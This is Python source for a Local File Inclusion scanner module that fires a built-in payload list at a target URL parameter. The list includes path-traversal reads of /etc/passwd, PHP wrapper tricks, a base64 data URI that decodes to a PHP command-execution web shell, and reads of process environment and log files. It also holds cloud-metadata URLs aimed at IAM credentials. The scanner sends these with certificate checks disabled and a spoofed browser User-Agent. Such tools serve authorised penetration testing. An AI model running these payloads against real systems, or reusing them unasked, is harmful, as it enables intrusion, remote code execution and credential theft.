"""
LFI (Local File Inclusion) scanner module.

Tests path traversal, PHP wrappers, proc filesystem, and cloud metadata paths
against a target parameter. Confirms a hit by matching known file content patterns
in the response body.
"""

import httpx
from typing import Optional

PAYLOADS: dict[str, list[str]] = {
    "null_byte": [
        "../../../etc/passwd%00",
        "../../etc/passwd%00.jpg",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "php_wrappers": [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://input",
        "zip://shell.jpg%23shell.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "phar://test.phar/test.php",
    ],
    "proc_container": [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.170.2/v2/credentials/",
    ],
}

# Content patterns that confirm a successful LFI read
CONFIRM_PATTERNS = [
    "root:x:0:0",
    "root:!:0:0",
    "/bin/bash",
    "/bin/sh",
    "nobody:x:",
    "daemon:x:",
    "HTTP_",             # proc/self/environ leak
    "SERVER_SOFTWARE",
    "AWS_SECRET",
    "ami-id",            # cloud metadata
    "instance-id",
]


class LFIModule:
    """
    Scans a URL parameter for Local File Inclusion vulnerabilities.

    Usage:
        module = LFIModule(timeout=10, verbose=True)
        finding = module.scan("https://target.com/page", "file")
    """

    def __init__(self, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
        )

    def _log(self, msg: str):
        if self.verbose:
            print(f"[LFI] {msg}")

    def _confirmed(self, body: str) -> Optional[str]:
        """Return the matched pattern if response confirms file read, else None."""
        for pattern in CONFIRM_PATTERNS:
            if pattern in body:
                return pattern
        return None

    def _probe(self, url: str, param: str, payload: str) -> Optional[dict]:
        """Inject payload into param and check response for LFI confirmation."""
        try:
            sep = "&" if "?" in url else "?"
            target = f"{url}{sep}{param}={payload}"
            self._log(f"Trying: {target}")
            resp = self.client.get(target)
            hit = self._confirmed(resp.text)
            if hit:
                return {
                    "type": "LFI",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "matched_pattern": hit,
                    "evidence": resp.text[:300],
                }
        except (httpx.RequestError, httpx.HTTPStatusError) as e:
            self._log(f"Request error: {e}")
        return None

    def scan(self, url: str, param: str) -> Optional[dict]:
        """
        Scan a URL parameter for LFI.

        Args:
            url:   Target URL (e.g. https://target.com/view)
            param: Parameter to inject into (e.g. "file" or "page")

        Returns:
            Finding dict on confirmed LFI, None otherwise.
        """
        self._log(f"Scanning {url} param={param}")
        for category, payloads in PAYLOADS.items():
            self._log(f"Testing category: {category}")
            for payload in payloads:
                finding = self._probe(url, param, payload)
                if finding:
                    finding["category"] = category
                    return finding
        return None

    def close(self):
        self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
